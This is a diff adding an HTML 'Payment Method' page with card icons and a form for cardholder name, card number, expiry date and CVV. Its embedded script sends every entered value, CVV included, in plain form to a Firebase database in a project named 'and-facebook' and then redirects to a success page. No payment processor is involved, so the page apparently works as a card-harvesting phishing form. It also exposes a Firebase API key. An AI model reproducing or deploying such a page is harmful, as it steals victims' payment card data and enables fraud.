@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Method</title>
+    <style>
+        body {
+            background-color: #f0f0f0;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 30px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="month"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+
+        .card-icons {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .card-icons img {
+            width: 50px;
+            margin: 0 10px;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #0b1252;
+            color: #fff;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #040d1a;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Payment Method</h1>
+        <div class="card-icons">
+            <img src="/visa.png" alt="Visa Card Icon">
+            <img src="/mastercard.png" alt="MasterCard Icon">
+            <img src="/amex.png" alt="American Express Card Icon">
+        </div>
+        <form id="payment-form">
+            <label for="cardholder-name">Cardholder Name</label>
+            <input type="text" id="cardholder-name" name="cardholder-name" placeholder="John Doe" required>
+
+            <label for="card-number">Card Number</label>
+            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="16" pattern="\d{16}" title="Please enter a valid 16-digit card number" required>
+
+            <label for="expiry-date">Expiry Date</label>
+            <input type="month" id="expiry-date" name="expiry-date" required>
+
+            <label for="cvv">CVV</label>
+            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" pattern="\d{3}" title="Enter a 3-digit CVV" inputmode="numeric" required>
+
+            <button type="submit">Pay Now</button>
+        </form>
+    </div>
+
+    <!-- Firebase and JavaScript -->
+    <script type="module">
+        // Import Firebase modules
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
+            authDomain: "and-facebook-ab84c.firebaseapp.com",
+            databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
+            projectId: "and-facebook-ab84c",
+            storageBucket: "and-facebook-ab84c.appspot.com",
+            messagingSenderId: "4885749329",
+            appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Handle form submission
+        const form = document.getElementById('payment-form');
+        form.addEventListener('submit', (event) => {
+            event.preventDefault();
+
+            // Get form data
+            const cardholderName = document.getElementById('cardholder-name').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Save to Firebase
+            const paymentRef = ref(db, 'payments/' + Date.now()); // Unique key using timestamp
+            set(paymentRef, {
+                cardholderName,
+                cardNumber,
+                expiryDate,
+                cvv
+            }).then(() => {
+                // Redirect after saving
+                window.location.href = 'successfulp.html';
+            }).catch((error) => {
+                alert('Failed to save payment information: ' + error.message);
+            });
+        });
+    </script>
+</body>
+</html>
